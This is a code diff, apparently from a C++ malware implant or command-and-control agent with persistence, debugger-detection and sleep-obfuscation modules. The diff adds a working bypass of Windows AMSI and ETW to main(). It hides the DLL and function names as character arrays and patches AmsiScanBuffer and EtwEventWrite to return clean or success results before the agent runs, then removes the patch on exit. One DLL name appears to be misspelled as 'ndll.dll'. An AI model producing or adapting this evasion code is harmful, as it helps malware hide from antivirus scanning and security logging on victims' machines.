@@ -13,7 +13,7 @@
 #include "file_utils.h"
 #include "persistence.h"
 #include "debug_detection.h"
-
+#include "bypass_amsi_etw.h"
 // [B21] Inclure le header de sleep obfuscation
 #include "sleep_obfuscation.h"
 
@@ -636,6 +636,52 @@ int main() {
     }
     #endif
 
+    // ========== INSTALLATION DU CONTOURNEMENT AMSI + ETW ==========
+    #ifdef BYPASS_AMSI_ETW_ENABLED
+    #ifdef _DEBUG
+    cout << "[*] Installing AMSI + ETW bypass..." << endl;
+    #endif
+
+
+    {
+        WCHAR wAmsi[]  = { L'a',L'm',L's',L'i',L'.',L'd',L'l',L'l',L'\0' };
+        WCHAR wNtdll[] = { L'n',L'd',L'l',L'l',L'.',L'd',L'l',L'l',L'\0' };
+        CHAR  cFunc[]  = { 'A','m','s','i','S','c','a','n','B','u','f','f','e','r','\0' };
+        CHAR  cEtw[]   = { 'E','t','w','E','v','e','n','t','W','r','i','t','e','\0' };
+
+        HMODULE hAmsi  = GetModuleHandleW(wAmsi);
+        HMODULE hNtdll = GetModuleHandleW(wNtdll);
+
+        if (hAmsi && hNtdll) {
+            PVOID fnScan = (PVOID)GetProcAddress(hAmsi, cFunc);
+            PVOID fnEtw  = (PVOID)GetProcAddress(hNtdll, cEtw);
+            if (fnScan && fnEtw) {
+                AddBypassTarget((PVOID)fnScan, S_OK, 6, kAmsiResultClean);
+                AddBypassTarget((PVOID)fnEtw, ERROR_SUCCESS);
+
+                if (InstallBypass()) {
+                    #ifdef _DEBUG
+                    cout << "[+] AMSI + ETW bypass installed successfully" << endl;
+                    #endif
+                } else {
+                    #ifdef _DEBUG
+                    cerr << "[!] Failed to install bypass" << endl;
+                    #endif
+                }
+            } else {
+                #ifdef _DEBUG
+                cerr << "[!] Failed to get function addresses for bypass" << endl;
+                #endif
+            }
+        } else {
+            #ifdef _DEBUG
+            cerr << "[!] Failed to load required DLLs for bypass" << endl;
+            #endif
+        }
+    }
+    #endif
+    // ==============================================================
+
     try {
         agent_run();
     }
@@ -643,8 +689,19 @@ int main() {
         #ifdef _DEBUG
         cerr << "[FATAL] " << e.what() << endl;
         #endif
+
+        // Nettoyer le contournement avant de quitter
+        #ifdef BYPASS_AMSI_ETW_ENABLED
+        UninstallBypass();
+        #endif
+
         return 1;
     }
+
+    // Nettoyer le contournement après l'exécution
+    #ifdef BYPASS_AMSI_ETW_ENABLED
+    UninstallBypass();
+    #endif
 
     return 0;
 }
